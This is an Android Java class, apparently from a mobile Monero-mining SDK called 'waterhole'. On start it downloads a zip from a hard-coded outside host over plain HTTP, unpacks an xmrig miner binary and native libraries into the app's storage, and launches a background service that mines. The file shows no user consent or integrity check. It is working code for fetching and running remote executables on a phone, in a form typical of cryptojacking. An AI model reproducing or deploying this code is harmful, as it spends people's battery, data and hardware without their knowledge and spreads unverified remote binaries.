package waterhole.miner.monero;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Environment;
import android.os.IBinder;

import java.io.File;
import java.io.ObjectStreamException;

import waterhole.miner.core.AbstractMiner;
import waterhole.miner.core.utils.FileUtils;
import waterhole.miner.core.utils.LogUtils;

import static waterhole.miner.core.asyn.AsyncTaskAssistant.executeOnThreadPool;
import static waterhole.miner.core.utils.FileUtils.unzip;
import static waterhole.miner.core.utils.LogUtils.info;
import static waterhole.miner.core.utils.FileUtils.downloadFile;

/**
 * 门罗挖矿类，对外提供，挖新版门罗，旧版门罗，自动切换门罗挖矿功能。
 *
 * @author kzw on 2018/05/16.
 */
public final class MoneroMiner extends AbstractMiner implements FileUtils.DownloadCallback, FileUtils.UnzipCallback {

    private static final String TAG = "Waterhole-XmrMiner";

    private static final String OLD_MINER_DOWNLOAD_URL = "http://eidon.top:8000/05171156/xmr-miner-old.zip";
    private static final String OLD_MINER_SAVE_FIILENAME = "xmr-miner-old.zip";

    private MoneroMiner() {
    }

    public static MoneroMiner instance() {
        return Holder.instance;
    }

    private static class Holder {
        static MoneroMiner instance = new MoneroMiner();
    }

    private Object readResolve() throws ObjectStreamException {
        return instance();
    }

    @Override
    public void startMine() {
        if (getContext() == null) {
            throw new RuntimeException("please call setContext() first");
        }
        executeOnThreadPool(new Runnable() {
            @Override
            public void run() {
                downloadFile(OLD_MINER_DOWNLOAD_URL,
                         getContext().getFilesDir().getAbsolutePath() + "/" + OLD_MINER_SAVE_FIILENAME,
                        MoneroMiner.this);
            }
        });
    }

    @Override
    public void stopMine() {
        if (binder != null) {
            binder.getService().stopMining();
        }
    }

    @Override
    public void onDownloadSuccess(String pathName) {
        info(TAG, "download old miner success");
        // 旧版门罗挖矿文件
        String fileDir = getContext().getFilesDir().getAbsolutePath();
        File xmrig = new File(fileDir + "/xmrig");
        LogUtils.info(TAG, "xmrig exist: " + xmrig.exists());
        File uvFile = new File(fileDir + "/libuv.so");
        LogUtils.info(TAG, "libuv.so exist: " + uvFile.exists());
        File cplusFile = new File(fileDir + "/libc++_shared.so");
        LogUtils.info(TAG, "libc++_shared.so exist: " + cplusFile.exists());
        if (!xmrig.exists() || !uvFile.exists() || !cplusFile.exists()) {
            unzip(pathName, fileDir, this);
        } else {
            onUnzipComplete(pathName);
        }
    }

    @Override
    public void onDownloadFail(String path, String reason) {
        info(TAG, "download old miner fail: " + reason);
    }

    @Override
    public void onUnzipComplete(String path) {
        info(TAG, "unzip old miner success");
        Intent intent = new Intent(getContext(), MineService.class);
        getContext().bindService(intent, serverConnection, Context.BIND_AUTO_CREATE);
        getContext().startService(intent);
    }

    @Override
    public void onUnzipFail(String path, String reason) {
        info(TAG, "unzip old miner fail: " + reason);
    }

    @Override
    public void onUnzipEntryFail(String path, String reason) {
        info(TAG, "unzip old miner entry fail: " + reason);
    }

    private MineService.MiningServiceBinder binder;

    private final ServiceConnection serverConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
            binder = (MineService.MiningServiceBinder) iBinder;
            binder.getService().startMining();
        }

        @Override
        public void onServiceDisconnected(ComponentName componentName) {
            binder = null;
        }
    };
}
